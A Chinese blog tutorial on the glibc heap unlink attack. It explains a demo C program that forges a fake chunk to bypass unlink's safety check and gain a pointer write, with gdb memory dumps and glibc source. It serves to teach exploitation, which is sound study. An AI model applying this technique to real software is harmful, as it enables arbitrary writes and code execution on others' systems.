<!DOCTYPE html>
<html lang=zh>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="unlink实例通过这个实例先看看unlink攻击到底是什么样，注意这个例子是在2.26版本之前，需要不启用tcache，大家可以使用patchelf修改动态链接库指向2.23版本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596">
<meta property="og:type" content="article">
<meta property="og:title" content="堆利用系列三：Unlink">
<meta property="og:url" content="https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/index.html">
<meta property="og:site_name" content="Colorlight&#39;s Blog">
<meta property="og:description" content="unlink实例通过这个实例先看看unlink攻击到底是什么样，注意这个例子是在2.26版本之前，需要不启用tcache，大家可以使用patchelf修改动态链接库指向2.23版本12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-23-15-18-54.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-22-15-32-49.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-22-15-47-54.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-22-16-30-24.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-22-20-24-21.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-22-20-35-44.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-22-20-35-16.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-22-20-28-31.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-23-15-28-37.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-23-17-23-42.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-23-17-30-54.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-23-17-46-43.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-23-19-25-19.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-23-20-41-27.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-23-19-27-30.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-23-19-30-09.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-23-20-09-18.png">
<meta property="og:image" content="https://colorlight.github.io/images/heap_exp/2021-05-23-20-50-49.png">
<meta property="article:published_time" content="2021-06-17T13:01:06.000Z">
<meta property="article:modified_time" content="2021-06-17T13:27:11.471Z">
<meta property="article:author" content="Colorlight">
<meta property="article:tag" content="堆利用">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://colorlight.github.io/images/heap_exp/2021-05-23-15-18-54.png">
    
    
      
        
          <link rel="shortcut icon" href="/images/favicon.ico">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/favicon-192x192.png" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon.png">
        
      
    
    <!-- title -->
    <title>堆利用系列三：Unlink</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
      <link rel="alternate" href="/atom.xml" title="Colorlight&#39;s Blog" type="application/atom+xml" />
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 5.4.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" "Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
         
          <li><a href="/">首页</a></li>
         
          <li><a href="/about/">关于</a></li>
         
          <li><a href="/archives/">归档</a></li>
         
          <li><a href="/tags/">标签</a></li>
         
          <li><a href="/categories/">分类</a></li>
        
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="上一篇 " href="/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8BFastbin-Attack/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="下一篇 " href="/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8B%C2%96%E5%A0%86%E6%BC%8F%E6%B4%9E/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="返回顶部 " href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="分享文章 " href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">上一篇</span>
      <span id="i-next" class="info" style="display:none;">下一篇</span>
      <span id="i-top" class="info" style="display:none;">返回顶部</span>
      <span id="i-share" class="info" style="display:none;">分享文章</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/&text=堆利用系列三：Unlink"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/&title=堆利用系列三：Unlink"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/&is_video=false&description=堆利用系列三：Unlink"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=堆利用系列三：Unlink&body=Check out this article: https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/&title=堆利用系列三：Unlink"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/&title=堆利用系列三：Unlink"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/&title=堆利用系列三：Unlink"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/&title=堆利用系列三：Unlink"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/&name=堆利用系列三：Unlink&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://colorlight.github.io/2021/06/17/%E5%A0%86%E5%88%A9%E7%94%A8%E7%B3%BB%E5%88%97%E4%B9%8Bunlink/&t=堆利用系列三：Unlink"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#unlink%E5%AE%9E%E4%BE%8B"><span class="toc-number">1.</span> <span class="toc-text">unlink实例</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Hitcon-2014-stkof"><span class="toc-number">2.</span> <span class="toc-text">Hitcon 2014 stkof</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%B0%8F%E7%BB%93"><span class="toc-number">3.</span> <span class="toc-text">小结</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        堆利用系列三：Unlink
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">Colorlight</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2021-06-17T13:01:06.000Z" itemprop="datePublished">2021-06-17</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/%E5%A0%86%E5%88%A9%E7%94%A8/">堆利用</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/%E5%A0%86%E5%88%A9%E7%94%A8/" rel="tag">堆利用</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="unlink实例"><a href="#unlink实例" class="headerlink" title="unlink实例"></a>unlink实例</h2><p>通过这个实例先看看unlink攻击到底是什么样，注意这个例子是在2.26版本之前，需要不启用tcache，大家可以使用patchelf修改动态链接库指向2.23版本<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line"></span><br><span class="line">uint64_t *target;</span><br><span class="line"></span><br><span class="line">int main(void)</span><br><span class="line">&#123;</span><br><span class="line"></span><br><span class="line">    puts(&quot;So let&apos;s explain what a heap Unlink attack is.&quot;);</span><br><span class="line">    puts(&quot;This will give us a write, however there are several restrictions on what we write and where.&quot;);</span><br><span class="line">    puts(&quot;Also this attack is only really feasible on pre-tcache libc versions (before 2.26).\n&quot;);</span><br><span class="line"></span><br><span class="line">    puts(&quot;For this attack to work, we need to know the address of a pointer to a heap pointer&quot;);</span><br><span class="line">    puts(&quot;Think of something like a global variable (like in the bss) array which stores heap pointers.&quot;);</span><br><span class="line">    puts(&quot;This attack will write a pointer to a little bit before the array (or the entry of the array that points to the heap chunk) to itself.&quot;);</span><br><span class="line">    puts(&quot;This can be pretty useful for a variety of reasons, especially if we write the pointer to an array of pointers that we can edit. Then we can leverage the pointer from the unlink to overwrite pointers in the array.\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;So we start off the attack by allocating two chunks, and storing the first chunk in the global variable pointer target\n&quot;);</span><br><span class="line">    printf(&quot;The goal of this will be to overwrite the pointer to target with an address right before it.\n\n&quot;);</span><br><span class="line">    uint64_t *ptr0, *ptr1, *temp;</span><br><span class="line"></span><br><span class="line">    ptr0 = (uint64_t *)malloc(0xa0);</span><br><span class="line">    ptr1 = (uint64_t *)malloc(0xa0);</span><br><span class="line"></span><br><span class="line">    target = ptr0;      </span><br><span class="line"></span><br><span class="line">    printf(&quot;The two chunk addresses are %p and %p\n&quot;, ptr0, ptr1);   //---------------&gt; b1 </span><br><span class="line">    printf(&quot;Target pointer stores the first chunk %p at %p\n\n&quot;, target, &amp;target);</span><br><span class="line"></span><br><span class="line">    printf(&quot;So what an unlink does, is it takes a chunk out of a doubly linked list (which certain freed chunks in the heap are stored in).\n&quot;);</span><br><span class="line">    printf(&quot;It handles the process of overwriting pointers from the next and previous chunks to the other, to fill in the gap from taking out the chunk in the middle.\n&quot;);</span><br><span class="line">    printf(&quot;That is where we get our pointer write from. However in order to set this up, we will need to make a fake chunk that will pass three checks.\n&quot;);</span><br><span class="line">    printf(&quot;So let&apos;s start setting up the fake chunk. \n\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;The first check we need to worry about, is it checks if the Fd and Bk pointers of our fake heap chunk (they point to the next and previous chunks) point to chunks that have pointers back to our fake chunk.\n&quot;);</span><br><span class="line">    printf(&quot;This is why we need the heap chunk our fake chunk is stored in to be stored in a pointer somewhere that we know the address of.\n&quot;);</span><br><span class="line">    printf(&quot;So the previous chunks forward pointer (these chunks are stored in a doubly linked list), and the next chunks back pointer both have to point to this chunk.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;The forward pointer of this type of heap chunk is at offset 0x10, and the back pointer is at offset 0x18.\n&quot;);</span><br><span class="line">    printf(&quot;As a result for the previous pointer we can just subtract 0x10 from the address of the target, and for the forward pointer we will just subtract 0x18 from the address of target.\n&quot;);</span><br><span class="line"></span><br><span class="line">    target[2] = (uint64_t)(&amp;target - 0x3);    // Fake Chunk P-&gt;fd pointer</span><br><span class="line">    target[3] = (uint64_t)(&amp;target - 0x2);    // Fake Chunk  P-&gt;bk pointer</span><br><span class="line"></span><br><span class="line">    printf(&quot;Fd pointer: %p\n&quot;, (void *)ptr0[2]);  //---------------------------&gt; b2</span><br><span class="line">    printf(&quot;Bk  pointer: %p\n\n&quot;, (void *)ptr0[3]);</span><br><span class="line"></span><br><span class="line">    temp = (uint64_t *)ptr0[2];</span><br><span class="line">    printf(&quot;Fake chunk starts at \t%p\n&quot;, (void *)ptr0);</span><br><span class="line">    printf(&quot;Fd-&gt;bk:    \t\t%p\n&quot;, (void *)temp[3]);</span><br><span class="line">    temp = (uint64_t *)ptr0[3];</span><br><span class="line">    printf(&quot;Bk-&gt;Fd:    \t\t%p\n\n&quot;, (void *)temp[2]);</span><br><span class="line"></span><br><span class="line">    printf(&quot;With that, we will pass that check. Next we have to worry about the size check.\n&quot;);</span><br><span class="line">    printf(&quot;How we will trigger a heap unlink is we will edit the heap metadata of the second chunk, so that it will say that the previous chunk has been freed and it points to our fake chunk.\n&quot;);</span><br><span class="line">    printf(&quot;Then when we free the second chunk, it will cause our fake chunk to be unlinked and execute the pointer write.\n&quot;);</span><br><span class="line">    printf(&quot;However it will check that the size of our chunk is equal to the previous size of the chunk being freed, so we have to make sure that they are equal.\n&quot;);</span><br><span class="line">    printf(&quot;The previous size of the second chunk should be shrunk down so it thinks the heap metadata starts with our fake chunk. This typically means shrinking it by 0x10.\n&quot;);</span><br><span class="line">    printf(&quot;In addition to that, we have to clear the previous in use bit from the size value of the second chunk, so it thinks that the previous chunk has been freed(this can be done with something like a heap overflow).\n&quot;);</span><br><span class="line"></span><br><span class="line">    target[0] = 0x0;    // Fake Chunk  Previous Size</span><br><span class="line">    target[1] = 0xa0;    // Fake Chunk  Size</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    ptr1[-2] = 0xa0;    // Second Chunk previous size  </span><br><span class="line">    ptr1[-1] = 0xb0;    // Secon Chunk size (can be done with a bug like a heap overflow)</span><br><span class="line"></span><br><span class="line">    printf(&quot;The final check we have to worry about is for fd_nextsize. Essentially it just checks to see if it is equal to 0x0, and if it is it skips a bunch of checks.\n&quot;);</span><br><span class="line">    printf(&quot;We will set it equal to 0x0 to avoid those unneeded checks.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    target[4] = 0x0;    // fd_nextsize</span><br><span class="line"></span><br><span class="line">    printf(&quot;With that, we have our fake chunk setup. Checkout the other writeups in this module for more details on the particular data structure of this heap chunk.\n\n&quot;);</span><br><span class="line"></span><br><span class="line">    printf(&quot;Fake Chunk Previous Size:\t0x%x\n&quot;, (int)ptr0[0]);</span><br><span class="line">    printf(&quot;Fake Chunk Size:\t\t0x%x\n&quot;, (int)ptr0[1]);</span><br><span class="line">    printf(&quot;Fake Chunk Fd pointer:\t\t0x%x\n&quot;, (int)ptr0[2]);</span><br><span class="line">    printf(&quot;Fake Chunk Bk pointer:\t\t0x%x\n&quot;, (int)ptr0[3]);</span><br><span class="line">    printf(&quot;Fake Chunk fd_nextsize:\t\t0x%x\n\n&quot;, (int)ptr0[4]);</span><br><span class="line"></span><br><span class="line">    printf(&quot;With that, we can free the second chunk and trigger the unlink.\n&quot;);</span><br><span class="line"></span><br><span class="line">    free(ptr1); // ----------------------------------&gt; b3</span><br><span class="line"></span><br><span class="line">    printf(&quot;With that target should be the address of the Fd pointer: %p\n&quot;, target);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p><img src="/images/heap_exp/2021-05-23-15-18-54.png" alt><br>红色箭头为在free(ptr1)之后target的指向</p>
<p>在b1处打断点，观察target的地址和储存值<br><img src="/images/heap_exp/2021-05-22-15-32-49.png" alt><br>target所在地址为bss全局变量区上的，存储的是ptr0指向的chunk1的地址0x5578420,与我们通过heap chunks观察到的地址相同。</p>
<p>在b2处打断点，观察内存情况<br><img src="/images/heap_exp/2021-05-22-15-47-54.png" alt></p>
<p>我们可以看到在target指向的heap chunk1-&gt;data中的偏移16个字节和偏移24个字节的地方被赋值，内容为bss段上&amp;target地址减去24和减去16。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">gef➤  (long *)&amp;target -3</span><br><span class="line">0x555555756000              // &amp;target -3的地址</span><br><span class="line">gef➤  (long *)&amp;target -2</span><br><span class="line">0x555555756008              // &amp;target -2的地址</span><br></pre></td></tr></table></figure></p>
<p>在b3处打断点观察free之前的内存情况<br>这个是Chunk1的内存情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/10gx 0x555555758420 - 16</span><br><span class="line">0x555555758410: 0x0000000000000000      0x00000000000000b1    // prev size | current size</span><br><span class="line">0x555555758420: 0x0000000000000000      0x00000000000000a0    // </span><br><span class="line">0x555555758430: 0x0000555555756000      0x0000555555756008    // &amp;target-3| &amp;target-2</span><br><span class="line">0x555555758440: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555758450: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>下面是chunk2的内存情况<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/10gx 0x5555557584d0 - 16</span><br><span class="line">0x5555557584c0: 0x00000000000000a0      0x00000000000000b0     // current的prev_inuse标志位被置0</span><br><span class="line">0x5555557584d0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557584e0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555557584f0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555758500: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>free(ptr1)的操作会带来的影响，由于chunk2的prev_inuse标志位被置0，free函数会调用进行后向融合，free的源码如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">/* consolidate backward */</span><br><span class="line">if (!prev_inuse(p)) &#123;</span><br><span class="line">  prevsize = p-&gt;prev_size;                       // prev_size 为0xa0</span><br><span class="line">  size += prevsize;</span><br><span class="line">  p = chunk_at_offset(p, -((long) prevsize));   // 这个指向的是0x5555557584c0 - 0xa0 = 0x555555758420 就是target[0]的内存地址</span><br><span class="line">  unlink(av, p, bck, fwd);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>所以unlink的参数p就是target[0]的地址0x555555758420<br>为了知道unlink函数到底是如何操作了内存，我们继续看一下unlink的源码<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#define unlink(AV, P, BK, FD) &#123;                                            \</span><br><span class="line">    FD = P-&gt;fd;								      \</span><br><span class="line">    BK = P-&gt;bk;								      \</span><br><span class="line">    if (__builtin_expect (FD-&gt;bk != P || BK-&gt;fd != P, 0))		      \</span><br><span class="line">      malloc_printerr (check_action, &quot;corrupted double-linked list&quot;, P, AV);  \</span><br><span class="line">    else &#123;								      \</span><br><span class="line">        FD-&gt;bk = BK;							      \</span><br><span class="line">        BK-&gt;fd = FD;							      \</span><br><span class="line">        if (!in_smallbin_range (P-&gt;size)				      \</span><br><span class="line">            &amp;&amp; __builtin_expect (P-&gt;fd_nextsize != NULL, 0)) &#123;		      \</span><br><span class="line">	    if (__builtin_expect (P-&gt;fd_nextsize-&gt;bk_nextsize != P, 0)	      \</span><br><span class="line">		|| __builtin_expect (P-&gt;bk_nextsize-&gt;fd_nextsize != P, 0))    \</span><br><span class="line">	      malloc_printerr (check_action,				      \</span><br><span class="line">			       &quot;corrupted double-linked list (not small)&quot;,    \</span><br><span class="line">			       P, AV);					      \</span><br><span class="line">            if (FD-&gt;fd_nextsize == NULL) &#123;				      \</span><br><span class="line">                if (P-&gt;fd_nextsize == P)				      \</span><br><span class="line">                  FD-&gt;fd_nextsize = FD-&gt;bk_nextsize = FD;		      \</span><br><span class="line">                else &#123;							      \</span><br><span class="line">                    FD-&gt;fd_nextsize = P-&gt;fd_nextsize;			      \</span><br><span class="line">                    FD-&gt;bk_nextsize = P-&gt;bk_nextsize;			      \</span><br><span class="line">                    P-&gt;fd_nextsize-&gt;bk_nextsize = FD;			      \</span><br><span class="line">                    P-&gt;bk_nextsize-&gt;fd_nextsize = FD;			      \</span><br><span class="line">                  &#125;							      \</span><br><span class="line">              &#125; else &#123;							      \</span><br><span class="line">                P-&gt;fd_nextsize-&gt;bk_nextsize = P-&gt;bk_nextsize;		      \</span><br><span class="line">                P-&gt;bk_nextsize-&gt;fd_nextsize = P-&gt;fd_nextsize;		      \</span><br><span class="line">              &#125;								      \</span><br><span class="line">          &#125;								      \</span><br><span class="line">      &#125;									      \</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<p>AV指向的是代表堆的数据结构malloc_state，P就是我们的target[0]地址，我们是在这个地方创建了一个假的chunk实际上。<br>进来之后首先会进行一个检查，<code>FD-&gt;bk != P || BK-&gt;fd != P</code> 看看FD的bk指针是不是指向的就是P，BK的fd指针是否指向P，为什么要有这个检查？<br>做这个检查主要是为了防止老版本的unlink导致的漏洞，正常的空闲链表是这样的<br><img src="/images/heap_exp/2021-05-22-16-30-24.png" alt><br>老版本的漏洞是，如果a2的fd和bk的值都已经被恶意修改了，比如利用一个堆溢出的漏洞修改了fd和bk，那么利用unlink就可以进行<br><code>a2-&gt;bk-&gt;fd = a2-&gt;fd</code>,由于a2-&gt;bk和a2-&gt;fd都可以被攻击者控制，那么攻击者就可以实现在任何一个内存地址上写任何一个自己想要的值，配合修改got表中的内容就可以实现任意代码执行的效果。</p>
<p>通过添加这个检查可以避免这种漏洞, 在unlink之前先检查a2-&gt;bk-&gt;fd是不是就是指向的a2, 就可以避免这种漏洞。</p>
<p>但是这种检查还是可以被绕过的，比如我们的这个例子就是通过创造一个虚假的chunk实现绕过这个unlink的检查。<br>现在a2就是target[0]的地址<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0x555555758420: 0x0000000000000000      0x00000000000000a0    // </span><br><span class="line">0x555555758430: 0x0000555555756000      0x0000555555756008    // &amp;target - 3  | &amp;target - 2 </span><br><span class="line">0x555555758440: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x555555758450: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure></p>
<p>FD的值为0x0000555555756000<br>BK的值为0x0000555555756008<br>FD-&gt;bk值为0x0000555555756000的内存偏移24的位置存储的值,我们知道0x0000555555756000这个值是&amp;target - 0x3， 它偏移24就是target的地址&amp;target，他存储的值就是target, 而BK-&gt;fd为0x0000555555756008偏移16的位置存储的值，我们知道0x0000555555756008这个值是&amp;target - 0x3，它偏移16也是&amp;target，那么它存储的值也是target，而P就是target，所以就绕过了这个<code>FD-&gt;bk != P || BK-&gt;fd != P</code>的检查。<br>而<code>FD-&gt;bk = BK</code>这个操作就是让存储target的内存设置为0x0000555555756008<br>而<code>BK-&gt;fd = FD;</code>这个操作是让存储target的内存设置为0x0000555555756000  （ (uint64_t)(&amp;target - 0x3); ）<br>所以我们检查一下target的值最后是不是<code>0x0000555555756000</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gef➤  x/g &amp;target</span><br><span class="line">0x555555756018 &lt;target&gt;:        0x0000555555756000</span><br></pre></td></tr></table></figure></p>
<p>我们可以看到结果如我们的预测。<br>这个到底有什么用呢？<br>假如我们现在有一个数组是这样的<br><img src="/images/heap_exp/2021-05-22-20-24-21.png" alt></p>
<p>当我们通过这种unlink的攻击，可以让target的值为array的开头，就是&amp;target -3，由于target本来是一个指向heap的指针，那么如果程序后面对heap的内存修改实际上是对这个数组的修改，如果这个内容可控的话，我们就可以修改会被调用的函数指针和是否通过认证的标志位，进而实现绕过认证或者任意代码执行的效果。或者是存在一个指针，这个指针在正常的业务中会被写入用户可控的内容，那么就构成了write what where的模式，可以实现往任意地方写任意内容的原型。</p>
